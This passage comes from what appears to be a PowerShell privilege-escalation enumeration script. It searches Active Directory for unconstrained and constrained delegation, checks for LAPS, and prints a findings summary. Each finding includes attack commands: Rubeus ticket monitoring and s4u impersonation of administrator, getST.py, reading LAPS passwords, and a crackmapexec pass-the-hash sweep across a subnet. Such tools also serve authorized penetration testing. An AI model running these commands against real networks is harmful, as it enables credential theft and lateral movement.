    sub "Unconstrained delegation"
    try {
        $searcher3 = New-Object DirectoryServices.DirectorySearcher
        $searcher3.Filter = '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))'
        $searcher3.PropertiesToLoad.AddRange(@('samaccountname','dnshostname'))
        $uncDel = $searcher3.FindAll()
        foreach ($c in $uncDel) {
            $cn = $c.Properties['dnshostname'][0]
            $sam = $c.Properties['samaccountname'][0]
            if ($sam -match 'DC\$|dc\$') { continue }
            $isSelf = ($cn -eq "$($cs.Name).$($cs.Domain)" -or $sam -match "^$([regex]::Escape($cs.Name))\$")
            if ($isSelf) { continue }
            finding 'HIGH' "Unconstrained delegation: $cn ($sam)" $null `
                "If you compromise this machine, you get TGTs of all users that connect to it.`nRubeus.exe monitor /interval:5"
        }
    } catch {}

    # Constrained delegation
    sub "Constrained delegation"
    try {
        $searcher4 = New-Object DirectoryServices.DirectorySearcher
        $searcher4.Filter = '(&(objectClass=*)(msDS-AllowedToDelegateTo=*))'
        $searcher4.PropertiesToLoad.AddRange(@('samaccountname','msds-allowedtodelegateto','useraccountcontrol'))
        $conDel = $searcher4.FindAll()
        foreach ($c in $conDel) {
            $sam = $c.Properties['samaccountname'][0]
            $targets = ($c.Properties['msds-allowedtodelegateto'] | Out-String).Trim()
            $uacVal = [int]$c.Properties['useraccountcontrol'][0]
            $proto = if ($uacVal -band 0x1000000) { 'ANY (protocol transition!)' } else { 'Kerberos only' }
            finding 'HIGH' "Constrained delegation: $sam -> $proto" `
                "Allowed targets:`n$targets" `
                "If you own $sam, impersonate any user to those services:`nRubeus.exe s4u /user:$sam /rc4:<hash> /impersonateuser:administrator /msdsspn:<target> /ptt`nOr: getST.py -spn <target> -impersonate administrator $($cs.Domain)/$sam"
        }
    } catch {}
}

sub "LAPS"
$laps = Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft Services\AdmPwd' -ErrorAction SilentlyContinue
if ($laps -and $laps.AdmPwdEnabled -eq 1) {
    finding 'INFO' "LAPS enabled" $null `
        "Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | ?{`$_.'ms-Mcs-AdmPwd'}"
} else {
    finding 'LOW' "LAPS not installed - local admin password may be reused" $null `
        "If you get local admin hash: crackmapexec smb <subnet>/24 -u Administrator -H <hash>"
}

# ════════════════════════════════════════════════════════════════
#  SUMMARY
# ════════════════════════════════════════════════════════════════

$line = [string]::new('=', 60)
Write-Host ""
Write-Host "  $line" -ForegroundColor White
if ($script:Total -gt 0) {
    Write-Host "  $($script:Total) findings total" -ForegroundColor Green
    if ($script:Actionable -gt 0) { Write-Host "  +-- $($script:Actionable) actionable (vertical privesc)" -ForegroundColor Green }
    if ($script:Lateral -gt 0)    { Write-Host "  +-- $($script:Lateral) lateral movement (other users)" -ForegroundColor Yellow }
    $other = $script:Total - $script:Actionable - $script:Lateral
    if ($other -gt 0)             { Write-Host "  +-- $other background info" -ForegroundColor DarkGray }
} else {
    Write-Host "  No findings." -ForegroundColor Yellow
}
Write-Host "  $line" -ForegroundColor White
Write-Host ""
